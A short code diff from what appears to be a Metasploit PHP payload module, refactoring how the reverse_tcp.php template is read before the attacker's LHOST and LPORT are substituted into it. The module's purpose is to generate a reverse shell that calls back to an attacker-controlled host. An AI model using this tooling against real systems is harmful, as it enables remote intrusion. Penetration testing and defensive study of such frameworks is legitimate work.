@@ -35,7 +35,12 @@ module Metasploit3
   # Constructs the payload
   #
   def generate
-    reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'php', 'reverse_tcp.php'))
+    pathname = Metasploit::Framework.root.join('data', 'php', 'reverse_tcp.php')
+
+    reverse = pathname.open('rb') { |f|
+      f.read(f.stat.size)
+    }
+
     reverse.gsub!("127.0.0.1", "#{datastore["LHOST"]}")
     reverse.gsub!("4444", "#{datastore["LPORT"]}")
     #reverse.gsub!(/#.*$/, '')
